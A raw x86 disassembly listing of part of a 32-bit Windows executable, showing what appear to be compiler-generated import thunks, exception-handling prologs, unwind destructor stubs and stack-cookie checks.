  40e9ec:	jmp    DWORD PTR ds:0x412244
  40e9f2:	int3   
  40e9f3:	int3   
  40e9f4:	int3   
  40e9f5:	int3   
  40e9f6:	int3   
  40e9f7:	int3   
  40e9f8:	jmp    DWORD PTR ds:0x412274
  40e9fe:	int3   
  40e9ff:	int3   
  40ea00:	int3   
  40ea01:	int3   
  40ea02:	int3   
  40ea03:	mov    ecx,DWORD PTR [ebp-0xc]
  40ea06:	mov    DWORD PTR fs:0x0,ecx
  40ea0d:	pop    ecx
  40ea0e:	pop    edi
  40ea0f:	pop    edi
  40ea10:	pop    esi
  40ea11:	pop    ebx
  40ea12:	mov    esp,ebp
  40ea14:	pop    ebp
  40ea15:	push   ecx
  40ea16:	ret    
  40ea17:	int3   
  40ea18:	int3   
  40ea19:	int3   
  40ea1a:	int3   
  40ea1b:	int3   
  40ea1c:	mov    ecx,DWORD PTR [ebp-0x10]
  40ea1f:	xor    ecx,ebp
  40ea21:	call   0x40e2c0
  40ea26:	jmp    0x40ea03
  40ea2b:	int3   
  40ea2c:	int3   
  40ea2d:	int3   
  40ea2e:	int3   
  40ea2f:	int3   
  40ea30:	mov    ecx,DWORD PTR [ebp-0x14]
  40ea33:	xor    ecx,ebp
  40ea35:	call   0x40e2c0
  40ea3a:	jmp    0x40ea03
  40ea3f:	int3   
  40ea40:	int3   
  40ea41:	int3   
  40ea42:	int3   
  40ea43:	int3   
  40ea44:	push   eax
  40ea45:	push   DWORD PTR fs:0x0
  40ea4c:	lea    eax,[esp+0xc]
  40ea50:	sub    esp,DWORD PTR [esp+0xc]
  40ea54:	push   ebx
  40ea55:	push   esi
  40ea56:	push   edi
  40ea57:	mov    DWORD PTR [eax],ebp
  40ea59:	mov    ebp,eax
  40ea5b:	mov    eax,ds:0x411004
  40ea60:	xor    eax,ebp
  40ea62:	push   eax
  40ea63:	push   DWORD PTR [ebp-0x4]
  40ea66:	mov    DWORD PTR [ebp-0x4],0xffffffff
  40ea6d:	lea    eax,[ebp-0xc]
  40ea70:	mov    fs:0x0,eax
  40ea76:	ret    
  40ea77:	int3   
  40ea78:	int3   
  40ea79:	int3   
  40ea7a:	int3   
  40ea7b:	int3   
  40ea7c:	push   eax
  40ea7d:	push   DWORD PTR fs:0x0
  40ea84:	lea    eax,[esp+0xc]
  40ea88:	sub    esp,DWORD PTR [esp+0xc]
  40ea8c:	push   ebx
  40ea8d:	push   esi
  40ea8e:	push   edi
  40ea8f:	mov    DWORD PTR [eax],ebp
  40ea91:	mov    ebp,eax
  40ea93:	mov    eax,ds:0x411004
  40ea98:	xor    eax,ebp
  40ea9a:	push   eax
  40ea9b:	mov    DWORD PTR [ebp-0x10],eax
  40ea9e:	push   DWORD PTR [ebp-0x4]
  40eaa1:	mov    DWORD PTR [ebp-0x4],0xffffffff
  40eaa8:	lea    eax,[ebp-0xc]
  40eaab:	mov    fs:0x0,eax
  40eab1:	ret    
  40eab2:	int3   
  40eab3:	int3   
  40eab4:	int3   
  40eab5:	int3   
  40eab6:	int3   
  40eab7:	push   eax
  40eab8:	push   DWORD PTR fs:0x0
  40eabf:	lea    eax,[esp+0xc]
  40eac3:	sub    esp,DWORD PTR [esp+0xc]
  40eac7:	push   ebx
  40eac8:	push   esi
  40eac9:	push   edi
  40eaca:	mov    DWORD PTR [eax],ebp
  40eacc:	mov    ebp,eax
  40eace:	mov    eax,ds:0x411004
  40ead3:	xor    eax,ebp
  40ead5:	push   eax
  40ead6:	mov    DWORD PTR [ebp-0x10],esp
  40ead9:	push   DWORD PTR [ebp-0x4]
  40eadc:	mov    DWORD PTR [ebp-0x4],0xffffffff
  40eae3:	lea    eax,[ebp-0xc]
  40eae6:	mov    fs:0x0,eax
  40eaec:	ret    
  40eaed:	int3   
  40eaee:	int3   
  40eaef:	int3   
  40eaf0:	int3   
  40eaf1:	int3   
  40eaf2:	push   eax
  40eaf3:	push   DWORD PTR fs:0x0
  40eafa:	lea    eax,[esp+0xc]
  40eafe:	sub    esp,DWORD PTR [esp+0xc]
  40eb02:	push   ebx
  40eb03:	push   esi
  40eb04:	push   edi
  40eb05:	mov    DWORD PTR [eax],ebp
  40eb07:	mov    ebp,eax
  40eb09:	mov    eax,ds:0x411004
  40eb0e:	xor    eax,ebp
  40eb10:	push   eax
  40eb11:	mov    DWORD PTR [ebp-0x14],eax
  40eb14:	mov    DWORD PTR [ebp-0x10],esp
  40eb17:	push   DWORD PTR [ebp-0x4]
  40eb1a:	mov    DWORD PTR [ebp-0x4],0xffffffff
  40eb21:	lea    eax,[ebp-0xc]
  40eb24:	mov    fs:0x0,eax
  40eb2a:	ret    
  40eb2b:	int3   
  40eb2c:	int3   
  40eb2d:	int3   
  40eb2e:	int3   
  40eb2f:	int3   
  40eb30:	jmp    DWORD PTR ds:0x412278
  40eb36:	int3   
  40eb37:	int3   
  40eb38:	int3   
  40eb39:	int3   
  40eb3a:	int3   
  40eb3b:	int3   
  40eb3c:	jmp    DWORD PTR ds:0x4121ec
  40eb42:	int3   
  40eb43:	int3   
  40eb44:	int3   
  40eb45:	int3   
  40eb46:	int3   
  40eb47:	int3   
  40eb48:	jmp    DWORD PTR ds:0x4121e8
  40eb4e:	int3   
  40eb4f:	int3   
  40eb50:	int3   
  40eb51:	int3   
  40eb52:	int3   
  40eb53:	int3   
  40eb54:	jmp    DWORD PTR ds:0x41222c
  40eb5a:	int3   
  40eb5b:	int3   
  40eb5c:	int3   
  40eb5d:	int3   
  40eb5e:	int3   
  40eb5f:	int3   
  40eb60:	int3   
  40eb61:	int3   
  40eb62:	int3   
  40eb63:	int3   
  40eb64:	int3   
  40eb65:	lea    ecx,[ebp-0x70]
  40eb68:	jmp    DWORD PTR ds:0x4121c0
  40eb6e:	lea    ecx,[ebp-0x6c]
  40eb71:	jmp    DWORD PTR ds:0x4121c0
  40eb77:	lea    ecx,[ebp-0x68]
  40eb7a:	jmp    DWORD PTR ds:0x4121c0
  40eb80:	lea    ecx,[ebp-0x30]
  40eb83:	jmp    DWORD PTR ds:0x4121c0
  40eb89:	lea    ecx,[ebp-0x70]
  40eb8c:	jmp    0x40599a
  40eb91:	mov    edx,DWORD PTR [esp+0x8]
  40eb95:	lea    eax,[edx-0x74]
  40eb98:	mov    ecx,DWORD PTR [edx-0x78]
  40eb9b:	xor    ecx,eax
  40eb9d:	call   0x40e2c0
  40eba2:	add    eax,0xc
  40eba5:	mov    ecx,DWORD PTR [edx-0x8]
  40eba8:	xor    ecx,eax
  40ebaa:	call   0x40e2c0
  40ebaf:	mov    eax,0x40f7f8
  40ebb4:	jmp    0x40eb30
  40ebb9:	int3   
  40ebba:	int3   
  40ebbb:	int3   
  40ebbc:	int3   
  40ebbd:	int3   
  40ebbe:	mov    edx,DWORD PTR [esp+0x8]
  40ebc2:	lea    eax,[edx+0xc]
  40ebc5:	mov    ecx,DWORD PTR [edx-0x34]
  40ebc8:	xor    ecx,eax
  40ebca:	call   0x40e2c0
  40ebcf:	mov    ecx,DWORD PTR [edx-0x8]
  40ebd2:	xor    ecx,eax
  40ebd4:	call   0x40e2c0
  40ebd9:	mov    eax,0x40f844
  40ebde:	jmp    0x40eb30
  40ebe3:	int3   
  40ebe4:	int3   
  40ebe5:	int3   
  40ebe6:	int3   
  40ebe7:	int3   
  40ebe8:	lea    ecx,[ebp-0x80]
  40ebeb:	jmp    DWORD PTR ds:0x4121c0
  40ebf1:	lea    ecx,[ebp-0x90]
  40ebf7:	jmp    DWORD PTR ds:0x4121c0
  40ebfd:	lea    ecx,[ebp-0x88]
  40ec03:	jmp    DWORD PTR ds:0x4121c0
  40ec09:	lea    ecx,[ebp-0x84]
  40ec0f:	jmp    DWORD PTR ds:0x4121c0
  40ec15:	lea    ecx,[ebp-0x68]
  40ec18:	jmp    DWORD PTR ds:0x4121c0
  40ec1e:	lea    ecx,[ebp-0x7c]
  40ec21:	jmp    DWORD PTR ds:0x4121c0
  40ec27:	lea    ecx,[ebp-0xa8]
  40ec2d:	jmp    DWORD PTR ds:0x4121c0
  40ec33:	lea    ecx,[ebp-0x9c]
  40ec39:	jmp    DWORD PTR ds:0x4121c0
  40ec3f:	lea    ecx,[ebp-0xa0]
  40ec45:	jmp    DWORD PTR ds:0x4121c0
  40ec4b:	lea    ecx,[ebp-0x94]
  40ec51:	jmp    DWORD PTR ds:0x4121c0
  40ec57:	lea    ecx,[ebp-0xac]
  40ec5d:	jmp    DWORD PTR ds:0x4121c0
  40ec63:	lea    ecx,[ebp-0x8c]
  40ec69:	jmp    DWORD PTR ds:0x4121c0
  40ec6f:	lea    ecx,[ebp-0xa4]
  40ec75:	jmp    DWORD PTR ds:0x4121c0
  40ec7b:	lea    ecx,[ebp-0xb0]
  40ec81:	jmp    DWORD PTR ds:0x4121c0
  40ec87:	lea    ecx,[ebp-0x98]
  40ec8d:	jmp    DWORD PTR ds:0x4121c0
  40ec93:	lea    ecx,[ebp-0x74]
  40ec96:	jmp    DWORD PTR ds:0x4121c0
  40ec9c:	lea    ecx,[ebp-0x6c]
  40ec9f:	jmp    DWORD PTR ds:0x4121c0
  40eca5:	lea    ecx,[ebp-0x70]
  40eca8:	jmp    DWORD PTR ds:0x4121c0
  40ecae:	lea    ecx,[ebp-0x78]
  40ecb1:	jmp    DWORD PTR ds:0x4121c0
  40ecb7:	lea    ecx,[ebp-0xb8]
  40ecbd:	jmp    DWORD PTR ds:0x4121c0
  40ecc3:	lea    ecx,[ebp-0xec]
  40ecc9:	jmp    0x405903
  40ecce:	lea    ecx,[ebp-0xd0]
  40ecd4:	jmp    DWORD PTR ds:0x4121c0
  40ecda:	lea    ecx,[ebp-0xcc]
  40ece0:	jmp    DWORD PTR ds:0x4121c0
  40ece6:	lea    ecx,[ebp-0xd4]
  40ecec:	jmp    DWORD PTR ds:0x4121c0
  40ecf2:	lea    ecx,[ebp-0xdc]
  40ecf8:	jmp    DWORD PTR ds:0x4121c0
  40ecfe:	lea    ecx,[ebp-0xd8]
  40ed04:	jmp    DWORD PTR ds:0x4121c0
  40ed0a:	lea    ecx,[ebp-0xc8]
  40ed10:	jmp    DWORD PTR ds:0x4121c0
  40ed16:	lea    ecx,[ebp-0xb4]
  40ed1c:	jmp    DWORD PTR ds:0x4121c0
  40ed22:	mov    edx,DWORD PTR [esp+0x8]
  40ed26:	lea    eax,[edx+0xc]
  40ed29:	mov    ecx,DWORD PTR [edx-0x12c]
  40ed2f:	xor    ecx,eax
  40ed31:	call   0x40e2c0
  40ed36:	mov    ecx,DWORD PTR [edx-0x8]
  40ed39:	xor    ecx,eax
  40ed3b:	call   0x40e2c0
  40ed40:	mov    eax,0x40f8d0
  40ed45:	jmp    0x40eb30
  40ed4a:	int3   
  40ed4b:	int3   
  40ed4c:	int3   
  40ed4d:	int3   
  40ed4e:	int3   
  40ed4f:	lea    ecx,[ebp-0x64]
  40ed52:	jmp    DWORD PTR ds:0x4121c0
  40ed58:	lea    ecx,[ebp-0x70]
  40ed5b:	jmp    DWORD PTR ds:0x4121c0
  40ed61:	lea    ecx,[ebp-0x6c]
  40ed64:	jmp    DWORD PTR ds:0x4121c0
  40ed6a:	lea    ecx,[ebp-0x68]
  40ed6d:	jmp    DWORD PTR ds:0x4121c0
  40ed73:	lea    ecx,[ebp-0x7c]
  40ed76:	jmp    DWORD PTR ds:0x4121c0
  40ed7c:	lea    ecx,[ebp-0x78]
  40ed7f:	jmp    DWORD PTR ds:0x4121c0
  40ed85:	lea    ecx,[ebp-0xa4]
  40ed8b:	jmp    0x405903
  40ed90:	lea    ecx,[ebp-0x84]
  40ed96:	jmp    DWORD PTR ds:0x4121c0
  40ed9c:	mov    edx,DWORD PTR [esp+0x8]
  40eda0:	lea    eax,[edx+0xc]
  40eda3:	mov    ecx,DWORD PTR [edx-0xb4]
  40eda9:	xor    ecx,eax
  40edab:	call   0x40e2c0
  40edb0:	mov    ecx,DWORD PTR [edx-0x8]
  40edb3:	xor    ecx,eax
  40edb5:	call   0x40e2c0
  40edba:	mov    eax,0x40fae0
  40edbf:	jmp    0x40eb30
  40edc4:	int3   
  40edc5:	int3   
  40edc6:	int3   
  40edc7:	int3   
  40edc8:	int3   
  40edc9:	lea    ecx,[ebp-0x24]
  40edcc:	jmp    DWORD PTR ds:0x4121c0
  40edd2:	lea    ecx,[ebp-0x34]
  40edd5:	jmp    DWORD PTR ds:0x4121c0
  40eddb:	lea    ecx,[ebp-0x2c]
  40edde:	jmp    DWORD PTR ds:0x4121c0
  40ede4:	lea    ecx,[ebp-0x20]
  40ede7:	jmp    DWORD PTR ds:0x4121c0
  40eded:	lea    ecx,[ebp-0x28]
  40edf0:	jmp    DWORD PTR ds:0x4121c0
  40edf6:	lea    ecx,[ebp-0x30]
  40edf9:	jmp    DWORD PTR ds:0x4121c0
  40edff:	lea    ecx,[ebp-0x38]
  40ee02:	jmp    0x405903
  40ee07:	mov    edx,DWORD PTR [esp+0x8]
  40ee0b:	lea    eax,[edx+0xc]
  40ee0e:	mov    ecx,DWORD PTR [edx-0x54]
  40ee11:	xor    ecx,eax
  40ee13:	call   0x40e2c0
  40ee18:	mov    ecx,DWORD PTR [edx-0x8]
  40ee1b:	xor    ecx,eax
  40ee1d:	call   0x40e2c0
  40ee22:	mov    eax,0x40fbe0
  40ee27:	jmp    0x40eb30
  40ee2c:	int3   
  40ee2d:	int3   
  40ee2e:	int3   
  40ee2f:	int3   
  40ee30:	int3   
  40ee31:	lea    ecx,[ebp-0x1c]
  40ee34:	jmp    DWORD PTR ds:0x4121c0
  40ee3a:	lea    ecx,[ebp-0x28]
  40ee3d:	jmp    0x405903
  40ee42:	mov    edx,DWORD PTR [esp+0x8]
  40ee46:	lea    eax,[edx+0xc]
  40ee49:	mov    ecx,DWORD PTR [edx-0x34]
  40ee4c:	xor    ecx,eax
  40ee4e:	call   0x40e2c0
  40ee53:	mov    ecx,DWORD PTR [edx-0x8]
  40ee56:	xor    ecx,eax
  40ee58:	call   0x40e2c0
  40ee5d:	mov    eax,0x40fc70
  40ee62:	jmp    0x40eb30
  40ee67:	int3   
  40ee68:	int3   
  40ee69:	int3   
  40ee6a:	int3   
  40ee6b:	int3   
  40ee6c:	lea    ecx,[ebp-0x1c]
  40ee6f:	jmp    DWORD PTR ds:0x4121c0
  40ee75:	lea    ecx,[ebp-0x28]
  40ee78:	jmp    0x405903
  40ee7d:	mov    edx,DWORD PTR [esp+0x8]
  40ee81:	lea    eax,[edx+0xc]
  40ee84:	mov    ecx,DWORD PTR [edx-0x34]
  40ee87:	xor    ecx,eax
  40ee89:	call   0x40e2c0
  40ee8e:	mov    ecx,DWORD PTR [edx-0x8]
  40ee91:	xor    ecx,eax
  40ee93:	call   0x40e2c0
  40ee98:	mov    eax,0x40fcd8
  40ee9d:	jmp    0x40eb30
  40eea2:	int3   
  40eea3:	int3   
  40eea4:	int3   
  40eea5:	int3   
  40eea6:	int3   
  40eea7:	lea    ecx,[ebp-0x1c]
  40eeaa:	jmp    DWORD PTR ds:0x4121c0
  40eeb0:	lea    ecx,[ebp-0x24]
  40eeb3:	jmp    DWORD PTR ds:0x4121c0
  40eeb9:	lea    ecx,[ebp-0x20]
  40eebc:	jmp    DWORD PTR ds:0x4121c0
  40eec2:	lea    ecx,[ebp-0x2c]
  40eec5:	jmp    0x405903
  40eeca:	mov    edx,DWORD PTR [esp+0x8]
  40eece:	lea    eax,[edx+0xc]
  40eed1:	mov    ecx,DWORD PTR [edx-0x44]
  40eed4:	xor    ecx,eax
  40eed6:	call   0x40e2c0
  40eedb:	mov    ecx,DWORD PTR [edx-0x8]
  40eede:	xor    ecx,eax
  40eee0:	call   0x40e2c0
  40eee5:	mov    eax,0x40fd40
  40eeea:	jmp    0x40eb30
  40eeef:	int3   
  40eef0:	int3   
  40eef1:	int3   
  40eef2:	int3   
  40eef3:	int3   
  40eef4:	lea    ecx,[ebp-0x1c]
  40eef7:	jmp    DWORD PTR ds:0x4121c0
  40eefd:	lea    ecx,[ebp-0x28]
  40ef00:	jmp    0x405903
  40ef05:	mov    edx,DWORD PTR [esp+0x8]
  40ef09:	lea    eax,[edx+0xc]
  40ef0c:	mov    ecx,DWORD PTR [edx-0x34]
  40ef0f:	xor    ecx,eax
  40ef11:	call   0x40e2c0
  40ef16:	mov    ecx,DWORD PTR [edx-0x8]
  40ef19:	xor    ecx,eax
  40ef1b:	call   0x40e2c0
  40ef20:	mov    eax,0x40fdf0
  40ef25:	jmp    0x40eb30
  40ef2a:	int3   
  40ef2b:	int3   
  40ef2c:	int3   
  40ef2d:	int3   
  40ef2e:	int3   
  40ef2f:	lea    ecx,[ebp-0x1c]
  40ef32:	jmp    DWORD PTR ds:0x4121c0
  40ef38:	lea    ecx,[ebp-0x24]
  40ef3b:	jmp    DWORD PTR ds:0x4121c0
  40ef41:	lea    ecx,[ebp-0x20]
  40ef44:	jmp    DWORD PTR ds:0x4121c0
  40ef4a:	lea    ecx,[ebp-0x30]
  40ef4d:	jmp    0x405903
  40ef52:	lea    ecx,[ebp-0x30]
  40ef55:	jmp    DWORD PTR ds:0x4121c0
  40ef5b:	mov    edx,DWORD PTR [esp+0x8]
  40ef5f:	lea    eax,[edx+0xc]
  40ef62:	mov    ecx,DWORD PTR [edx-0x44]
  40ef65:	xor    ecx,eax
  40ef67:	call   0x40e2c0
  40ef6c:	mov    ecx,DWORD PTR [edx-0x8]
  40ef6f:	xor    ecx,eax
  40ef71:	call   0x40e2c0
  40ef76:	mov    eax,0x40fe58
  40ef7b:	jmp    0x40eb30
  40ef80:	int3   
  40ef81:	int3   
  40ef82:	int3   
  40ef83:	int3   
  40ef84:	int3   
  40ef85:	int3   
  40ef86:	int3   
  40ef87:	lea    ecx,[ebp-0x44]
  40ef8a:	jmp    DWORD PTR ds:0x4121c0
  40ef90:	lea    ecx,[ebp-0x54]
  40ef93:	jmp    DWORD PTR ds:0x4121c0
  40ef99:	lea    ecx,[ebp-0x50]
  40ef9c:	jmp    DWORD PTR ds:0x4121c0
  40efa2:	lea    ecx,[ebp-0x58]
  40efa5:	jmp    0x405903
  40efaa:	lea    ecx,[ebp-0x40]
  40efad:	jmp    DWORD PTR ds:0x4121c0
  40efb3:	lea    ecx,[ebp-0x3c]
  40efb6:	jmp    DWORD PTR ds:0x4121c0
  40efbc:	lea    ecx,[ebp-0x38]
  40efbf:	jmp    DWORD PTR ds:0x4121c0
  40efc5:	lea    ecx,[ebp-0x34]
  40efc8:	jmp    DWORD PTR ds:0x4121c0
  40efce:	lea    ecx,[ebp-0x30]
  40efd1:	jmp    DWORD PTR ds:0x4121c0
  40efd7:	lea    ecx,[ebp-0x2c]
  40efda:	jmp    DWORD PTR ds:0x4121c0
  40efe0:	lea    ecx,[ebp-0x28]
  40efe3:	jmp    DWORD PTR ds:0x4121c0
  40efe9:	lea    ecx,[ebp-0x24]
  40efec:	jmp    DWORD PTR ds:0x4121c0
  40eff2:	lea    ecx,[ebp-0x20]
  40eff5:	jmp    DWORD PTR ds:0x4121c0
  40effb:	lea    ecx,[ebp-0x1c]
  40effe:	jmp    DWORD PTR ds:0x4121c0
  40f004:	push   DWORD PTR ds:0x4121c0
  40f00a:	push   0xb
  40f00c:	push   0x4
  40f00e:	lea    eax,[ebp-0x40]
  40f011:	push   eax
  40f012:	call   0x40e307
  40f017:	ret    
  40f018:	lea    ecx,[ebp-0x68]
  40f01b:	jmp    DWORD PTR ds:0x4121c0
  40f021:	lea    ecx,[ebp-0x60]
  40f024:	jmp    DWORD PTR ds:0x4121c0
  40f02a:	lea    ecx,[ebp-0x80]
  40f02d:	jmp    0x405903
  40f032:	mov    edx,DWORD PTR [esp+0x8]
  40f036:	lea    eax,[edx+0xc]
  40f039:	mov    ecx,DWORD PTR [edx-0x94]
  40f03f:	xor    ecx,eax
  40f041:	call   0x40e2c0
  40f046:	mov    ecx,DWORD PTR [edx-0x8]
  40f049:	xor    ecx,eax
  40f04b:	call   0x40e2c0
  40f050:	mov    eax,0x40ff10
  40f055:	jmp    0x40eb30
  40f05a:	int3   
  40f05b:	int3   
  40f05c:	int3   
  40f05d:	int3   
  40f05e:	int3   
  40f05f:	lea    ecx,[ebp-0x18]
  40f062:	jmp    DWORD PTR ds:0x4121c0
  40f068:	mov    edx,DWORD PTR [esp+0x8]
  40f06c:	lea    eax,[edx+0xc]
  40f06f:	mov    ecx,DWORD PTR [edx-0x1c]
  40f072:	xor    ecx,eax
  40f074:	call   0x40e2c0
  40f079:	mov    ecx,DWORD PTR [edx-0x4]
  40f07c:	xor    ecx,eax
  40f07e:	call   0x40e2c0
  40f083:	mov    eax,0x410030
  40f088:	jmp    0x40eb30
  40f08d:	int3   
  40f08e:	int3   
  40f08f:	int3   
  40f090:	int3   
  40f091:	int3   
  40f092:	lea    ecx,[ebp-0x24]
  40f095:	jmp    DWORD PTR ds:0x4121c0
  40f09b:	lea    ecx,[ebp-0x34]
  40f09e:	jmp    0x405903
  40f0a3:	lea    ecx,[ebp-0x1c]
  40f0a6:	jmp    DWORD PTR ds:0x4121c0
  40f0ac:	lea    ecx,[ebp-0x34]
  40f0af:	jmp    0x405903
  40f0b4:	lea    ecx,[ebp-0x28]
  40f0b7:	jmp    DWORD PTR ds:0x4121c0
  40f0bd:	lea    ecx,[ebp-0x2c]
  40f0c0:	jmp    DWORD PTR ds:0x4121c0
  40f0c6:	lea    ecx,[ebp-0x38]
  40f0c9:	jmp    DWORD PTR ds:0x4121c0
  40f0cf:	lea    ecx,[ebp-0x30]
  40f0d2:	jmp    DWORD PTR ds:0x4121c0
  40f0d8:	mov    edx,DWORD PTR [esp+0x8]
  40f0dc:	lea    eax,[edx+0xc]
  40f0df:	mov    ecx,DWORD PTR [edx-0x54]
  40f0e2:	xor    ecx,eax
  40f0e4:	call   0x40e2c0
  40f0e9:	mov    ecx,DWORD PTR [edx-0x8]
  40f0ec:	xor    ecx,eax
  40f0ee:	call   0x40e2c0
  40f0f3:	mov    eax,0x410060
  40f0f8:	jmp    0x40eb30
  40f0fd:	int3   
  40f0fe:	int3   
  40f0ff:	int3   
  40f100:	int3   
  40f101:	int3   
  40f102:	lea    ecx,[ebp-0x18]
  40f105:	jmp    DWORD PTR ds:0x4121c0
  40f10b:	lea    ecx,[ebp-0x24]
  40f10e:	jmp    DWORD PTR ds:0x4121c0
  40f114:	mov    edx,DWORD PTR [esp+0x8]
  40f118:	lea    eax,[edx+0xc]
  40f11b:	mov    ecx,DWORD PTR [edx-0x34]
  40f11e:	xor    ecx,eax
  40f120:	call   0x40e2c0
  40f125:	mov    eax,0x410130
  40f12a:	jmp    0x40eb30
  40f12f:	int3   
  40f130:	int3   
  40f131:	int3   
  40f132:	int3   
  40f133:	int3   
  40f134:	lea    ecx,[ebp-0x1c]
  40f137:	jmp    DWORD PTR ds:0x4121c0
  40f13d:	lea    ecx,[ebp-0x20]
  40f140:	jmp    DWORD PTR ds:0x4121c0
  40f146:	lea    ecx,[ebp-0x38]
  40f149:	jmp    DWORD PTR ds:0x4121c0
  40f14f:	lea    ecx,[ebp-0x3c]
  40f152:	jmp    DWORD PTR ds:0x4121c0
  40f158:	mov    edx,DWORD PTR [esp+0x8]
  40f15c:	lea    eax,[edx+0xc]
  40f15f:	mov    ecx,DWORD PTR [edx-0x7c]
  40f162:	xor    ecx,eax
  40f164:	call   0x40e2c0
  40f169:	mov    eax,0x410198
  40f16e:	jmp    0x40eb30
  40f173:	int3   
  40f174:	int3   
  40f175:	int3   
  40f176:	int3   
  40f177:	int3   
  40f178:	push   DWORD PTR [ebp-0x10]
  40f17b:	call   0x40df9b
  40f180:	pop    ecx
  40f181:	ret    
  40f182:	mov    edx,DWORD PTR [esp+0x8]
  40f186:	lea    eax,[edx+0xc]
  40f189:	mov    ecx,DWORD PTR [edx-0x14]
  40f18c:	xor    ecx,eax
  40f18e:	call   0x40e2c0
  40f193:	mov    eax,0x410248
  40f198:	jmp    0x40eb30
  40f19d:	int3   
  40f19e:	int3   
  40f19f:	int3   
  40f1a0:	int3   
  40f1a1:	int3   
  40f1a2:	mov    ecx,DWORD PTR [ebp-0x14]
  40f1a5:	jmp    DWORD PTR ds:0x4121c0
  40f1ab:	mov    ecx,DWORD PTR [ebp-0x14]
  40f1ae:	add    ecx,0x4
  40f1b1:	jmp    DWORD PTR ds:0x4121c0
  40f1b7:	mov    ecx,DWORD PTR [ebp-0x14]
  40f1ba:	add    ecx,0x8
  40f1bd:	jmp    DWORD PTR ds:0x4121c0
  40f1c3:	mov    ecx,DWORD PTR [ebp-0x14]
  40f1c6:	add    ecx,0x40
  40f1c9:	jmp    DWORD PTR ds:0x4121c0
  40f1cf:	mov    edx,DWORD PTR [esp+0x8]
  40f1d3:	lea    eax,[edx+0xc]
  40f1d6:	mov    ecx,DWORD PTR [edx-0x18]
  40f1d9:	xor    ecx,eax
  40f1db:	call   0x40e2c0
  40f1e0:	mov    ecx,DWORD PTR [edx-0x4]
  40f1e3:	xor    ecx,eax
  40f1e5:	call   0x40e2c0
  40f1ea:	mov    eax,0x410274
  40f1ef:	jmp    0x40eb30
  40f1f4:	int3   
  40f1f5:	int3   
  40f1f6:	int3   
  40f1f7:	int3   
  40f1f8:	int3   
  40f1f9:	lea    ecx,[ebp-0x10]
  40f1fc:	jmp    DWORD PTR ds:0x4121c0
  40f202:	mov    edx,DWORD PTR [esp+0x8]
  40f206:	lea    eax,[edx+0xc]
  40f209:	mov    ecx,DWORD PTR [edx-0x14]
  40f20c:	xor    ecx,eax
  40f20e:	call   0x40e2c0
  40f213:	mov    eax,0x4102b8
  40f218:	jmp    0x40eb30
  40f21d:	int3   
  40f21e:	int3   
  40f21f:	int3   
  40f220:	int3   
  40f221:	int3   
  40f222:	lea    ecx,[ebp-0x14]
  40f225:	jmp    DWORD PTR ds:0x4121c0
  40f22b:	lea    ecx,[ebp-0x18]
  40f22e:	jmp    DWORD PTR ds:0x4121c0
  40f234:	mov    edx,DWORD PTR [esp+0x8]
  40f238:	lea    eax,[edx+0xc]
  40f23b:	mov    ecx,DWORD PTR [edx-0x1c]
  40f23e:	xor    ecx,eax
  40f240:	call   0x40e2c0
  40f245:	mov    eax,0x4102e4
  40f24a:	jmp    0x40eb30
  40f24f:	int3   
  40f250:	int3   
  40f251:	int3   
  40f252:	int3   
  40f253:	int3   
  40f254:	lea    ecx,[ebp-0x14]
  40f257:	jmp    DWORD PTR ds:0x4121c0
  40f25d:	lea    ecx,[ebp-0x18]
  40f260:	jmp    DWORD PTR ds:0x4121c0
  40f266:	mov    edx,DWORD PTR [esp+0x8]
  40f26a:	lea    eax,[edx+0xc]
  40f26d:	mov    ecx,DWORD PTR [edx-0x1c]
  40f270:	xor    ecx,eax
  40f272:	call   0x40e2c0
  40f277:	mov    eax,0x41034c
  40f27c:	jmp    0x40eb30
  40f281:	int3   
  40f282:	int3   
  40f283:	int3   
  40f284:	int3   
  40f285:	int3   
  40f286:	mov    edx,DWORD PTR [esp+0x8]
  40f28a:	lea    eax,[edx+0xc]
  40f28d:	mov    ecx,DWORD PTR [edx-0x24]
  40f290:	xor    ecx,eax
  40f292:	call   0x40e2c0
  40f297:	mov    ecx,DWORD PTR [edx-0x8]
  40f29a:	xor    ecx,eax
  40f29c:	call   0x40e2c0
  40f2a1:	mov    eax,0x4103b4
  40f2a6:	jmp    0x40eb30
  40f2ab:	int3   
  40f2ac:	int3   
  40f2ad:	int3   
  40f2ae:	int3   
  40f2af:	int3   
  40f2b0:	lea    ecx,[ebp-0x34]
  40f2b3:	jmp    0x405903
  40f2b8:	lea    ecx,[ebp-0x1c]
  40f2bb:	jmp    0x405903
  40f2c0:	lea    ecx,[ebp-0x20]
  40f2c3:	jmp    0x405903
  40f2c8:	lea    ecx,[ebp-0x18]
  40f2cb:	jmp    0x405903
  40f2d0:	lea    ecx,[ebp-0x24]
  40f2d3:	jmp    0x405903
  40f2d8:	lea    ecx,[ebp-0x28]
  40f2db:	jmp    0x405903
  40f2e0:	lea    ecx,[ebp-0x4c]
  40f2e3:	jmp    0x405903
  40f2e8:	lea    ecx,[ebp-0x44]
  40f2eb:	jmp    0x405903
  40f2f0:	lea    ecx,[ebp-0x28]
  40f2f3:	jmp    0x405903
  40f2f8:	lea    ecx,[ebp-0x24]
  40f2fb:	jmp    0x405903
  40f300:	lea    ecx,[ebp-0x3c]
  40f303:	jmp    0x405903
  40f308:	lea    ecx,[ebp-0x44]
  40f30b:	jmp    0x405903
  40f310:	lea    ecx,[ebp-0x4c]
  40f313:	jmp    0x405903
  40f318:	lea    ecx,[ebp-0x3c]
  40f31b:	jmp    0x405903
  40f320:	mov    edx,DWORD PTR [esp+0x8]
  40f324:	lea    eax,[edx+0xc]
  40f327:	mov    ecx,DWORD PTR [edx-0x58]
  40f32a:	xor    ecx,eax
  40f32c:	call   0x40e2c0
  40f331:	mov    ecx,DWORD PTR [edx-0x8]
  40f334:	xor    ecx,eax
  40f336:	call   0x40e2c0
  40f33b:	mov    eax,0x410410
  40f340:	jmp    0x40eb30
  40f345:	int3   
  40f346:	int3   
  40f347:	int3   
  40f348:	int3   
  40f349:	int3   
  40f34a:	lea    ecx,[ebp-0x14]
  40f34d:	jmp    DWORD PTR ds:0x4121c0
  40f353:	mov    edx,DWORD PTR [esp+0x8]
  40f357:	lea    eax,[edx+0xc]
  40f35a:	mov    ecx,DWORD PTR [edx-0x30]
  40f35d:	xor    ecx,eax
  40f35f:	call   0x40e2c0
  40f364:	mov    eax,0x4104d8
  40f369:	jmp    0x40eb30
  40f36e:	int3   
  40f36f:	int3   
  40f370:	int3   
  40f371:	int3   
  40f372:	int3   
  40f373:	lea    ecx,[ebp-0x14]
  40f376:	jmp    DWORD PTR ds:0x4121c0
  40f37c:	lea    ecx,[ebp-0x18]
  40f37f:	jmp    DWORD PTR ds:0x4121c0
